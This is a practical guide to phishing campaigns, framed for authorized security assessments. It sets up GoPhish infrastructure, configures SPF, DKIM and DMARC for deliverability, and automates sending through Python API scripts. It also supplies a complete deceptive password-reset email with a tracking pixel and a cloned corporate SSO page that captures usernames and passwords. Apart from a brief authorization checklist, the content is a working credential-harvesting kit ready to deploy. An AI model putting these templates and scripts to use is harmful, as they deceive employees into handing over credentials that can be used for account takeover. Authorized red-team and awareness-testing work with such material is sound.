# Phishing Campaign Design Guide

> Practical reference for designing, deploying, and tracking phishing campaigns during authorized security assessments, covering template creation, infrastructure setup, and metrics collection.

---

## 1. Infrastructure Setup

Proper infrastructure is critical for campaign deliverability and operational security.

```bash
# GoPhish installation and setup
wget https://github.com/gophish/gophish/releases/latest/download/gophish-v0.12.1-linux-64bit.zip
unzip gophish-v0.12.1-linux-64bit.zip -d /opt/gophish
cd /opt/gophish

# Generate TLS certificate for admin panel
openssl req -x509 -newkey rsa:4096 -keyout admin.key -out admin.crt \
  -days 365 -nodes -subj "/CN=phish-admin.internal"

# Configure GoPhish
cat > config.json << 'EOF'
{
  "admin_server": {
    "listen_url": "127.0.0.1:3333",
    "use_tls": true,
    "cert_path": "admin.crt",
    "key_path": "admin.key"
  },
  "phish_server": {
    "listen_url": "0.0.0.0:443",
    "use_tls": true,
    "cert_path": "/etc/letsencrypt/live/mail.assessment-domain.com/fullchain.pem",
    "key_path": "/etc/letsencrypt/live/mail.assessment-domain.com/privkey.pem"
  }
}
EOF

./gophish &
```

```bash
# DNS and email authentication setup for deliverability
# SPF record
echo "v=spf1 ip4:YOUR_SERVER_IP -all" 
# Add as TXT record for assessment-domain.com

# DKIM setup with opendkim
opendkim-genkey -s mail -d assessment-domain.com
# Add mail._domainkey TXT record with generated public key

# DMARC record
echo "v=DMARC1; p=none; rua=mailto:dmarc@assessment-domain.com"
# Add as TXT record: _dmarc.assessment-domain.com

# Verify DNS propagation
dig TXT assessment-domain.com +short
dig TXT mail._domainkey.assessment-domain.com +short
```

---

## 2. Email Template Creation

```html
<!-- Credential harvesting template - password reset pretext -->
<!DOCTYPE html>
<html>
<head><meta charset="utf-8"></head>
<body style="font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; max-width: 600px; margin: 0 auto;">
  <div style="background: #1a73e8; padding: 20px; text-align: center;">
    <img src="{{.URL}}/static/logo.png" alt="Company Logo" style="height: 40px;">
  </div>
  <div style="padding: 30px; background: #fff; border: 1px solid #ddd;">
    <h2 style="color: #202124;">Password Reset Required</h2>
    <p>Hi {{.FirstName}},</p>
    <p>Our security team detected unusual activity on your account. As a precaution, 
       please verify your identity by resetting your password within 24 hours.</p>
    <div style="text-align: center; margin: 30px 0;">
      <a href="{{.URL}}" style="background: #1a73e8; color: white; padding: 12px 24px; 
         text-decoration: none; border-radius: 4px; font-weight: bold;">
        Reset Password
      </a>
    </div>
    <p style="color: #5f6368; font-size: 12px;">
      If you did not request this, please contact IT support immediately.<br>
      Reference: INC-{{.RId}}
    </p>
  </div>
  <!-- Tracking pixel -->
  <img src="{{.TrackingURL}}" style="display:none" alt="">
</body>
</html>
```

---

## 3. Landing Page Design

```html
<!-- Credential capture landing page mimicking SSO -->
<!DOCTYPE html>
<html>
<head>
  <title>Sign In - Corporate SSO</title>
  <style>
    body { font-family: 'Segoe UI', sans-serif; background: #f5f5f5; display: flex; 
           justify-content: center; align-items: center; height: 100vh; margin: 0; }
    .login-box { background: white; padding: 40px; border-radius: 8px; 
                 box-shadow: 0 2px 10px rgba(0,0,0,0.1); width: 360px; }
    input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; 
            border-radius: 4px; box-sizing: border-box; }
    button { width: 100%; padding: 12px; background: #1a73e8; color: white; 
             border: none; border-radius: 4px; cursor: pointer; font-size: 16px; }
  </style>
</head>
<body>
  <div class="login-box">
    <img src="/static/company-logo.png" style="width: 200px; margin-bottom: 20px;">
    <h3>Sign in to continue</h3>
    <form method="POST" action="">
      <input type="email" name="username" placeholder="Email address" required>
      <input type="password" name="password" placeholder="Password" required>
      <button type="submit">Sign In</button>
      <input type="hidden" name="rid" value="{{.RId}}">
    </form>
    <p style="font-size: 12px; color: #666; margin-top: 15px;">
      Protected by Corporate Security | <a href="#">Privacy Policy</a>
    </p>
  </div>
</body>
</html>
```

---

## 4. Campaign Automation with GoPhish API

```python
# Automated campaign launch via GoPhish REST API
import requests
import json
from datetime import datetime, timedelta

GOPHISH_URL = "https://127.0.0.1:3333"
API_KEY = "your-gophish-api-key"
HEADERS = {"Authorization": f"Bearer {API_KEY}", "Content-Type": "application/json"}

# Create sending profile
smtp_profile = {
    "name": "Assessment SMTP",
    "host": "mail.assessment-domain.com:587",
    "from_address": "security@assessment-domain.com",
    "username": "security@assessment-domain.com",
    "password": "smtp_password",
    "ignore_cert_errors": False
}
requests.post(f"{GOPHISH_URL}/api/smtp/", headers=HEADERS, 
              json=smtp_profile, verify=False)

# Create target group from CSV
group = {
    "name": "Q1 Assessment Targets",
    "targets": [
        {"first_name": "John", "last_name": "Doe", "email": "john.doe@target.com"},
        {"first_name": "Jane", "last_name": "Smith", "email": "jane.smith@target.com"},
    ]
}
requests.post(f"{GOPHISH_URL}/api/groups/", headers=HEADERS, json=group, verify=False)

# Launch campaign with staggered sending
campaign = {
    "name": f"Security Assessment - {datetime.now().strftime('%Y-%m-%d')}",
    "template": {"name": "Password Reset Template"},
    "page": {"name": "SSO Login Page"},
    "smtp": {"name": "Assessment SMTP"},
    "url": "https://sso-verify.assessment-domain.com",
    "groups": [{"name": "Q1 Assessment Targets"}],
    "launch_date": datetime.now().isoformat() + "Z",
    "send_by_date": (datetime.now() + timedelta(hours=4)).isoformat() + "Z"
}
resp = requests.post(f"{GOPHISH_URL}/api/campaigns/", headers=HEADERS, 
                     json=campaign, verify=False)
print(f"Campaign launched: {resp.json().get('id')}")
```

---

## 5. Metrics Collection and Reporting

```python
# Pull campaign results for reporting
import requests
from collections import Counter

GOPHISH_URL = "https://127.0.0.1:3333"
API_KEY = "your-gophish-api-key"
HEADERS = {"Authorization": f"Bearer {API_KEY}"}

campaign_id = 1
resp = requests.get(f"{GOPHISH_URL}/api/campaigns/{campaign_id}/results",
                    headers=HEADERS, verify=False)
results = resp.json()

# Aggregate metrics
statuses = Counter(r["status"] for r in results.get("results", []))
timeline = results.get("timeline", [])

report = {
    "total_targets": len(results.get("results", [])),
    "emails_sent": statuses.get("Email Sent", 0),
    "emails_opened": statuses.get("Email Opened", 0),
    "links_clicked": statuses.get("Clicked Link", 0),
    "credentials_submitted": statuses.get("Submitted Data", 0),
    "reported_phish": statuses.get("Email Reported", 0),
}

report["click_rate"] = f"{report['links_clicked']/report['total_targets']*100:.1f}%"
report["submission_rate"] = f"{report['credentials_submitted']/report['total_targets']*100:.1f}%"

for key, val in report.items():
    print(f"{key}: {val}")
```

---

## 6. Operational Security Considerations

```bash
# Pre-campaign checklist
# 1. Verify written authorization (Rules of Engagement document)
# 2. Confirm scope and excluded targets
# 3. Set up out-of-band communication with client POC
# 4. Prepare immediate credential reset procedure

# Domain age check (new domains get flagged)
whois assessment-domain.com | grep "Creation Date"

# Test email deliverability before campaign
swaks --to test@target.com \
  --from security@assessment-domain.com \
  --server mail.assessment-domain.com:587 \
  --tls --auth-user security@assessment-domain.com \
  --auth-password "smtp_password" \
  --header "Subject: Test Delivery" \
  --body "Deliverability test"

# Monitor blacklist status during campaign
for bl in zen.spamhaus.org bl.spamcop.net; do
  dig +short $(echo YOUR_IP | awk -F. '{print $4"."$3"."$2"."$1}').$bl
done
```

All phishing campaigns must be conducted under explicit written authorization with defined scope, rules of engagement, and immediate incident response procedures in place.
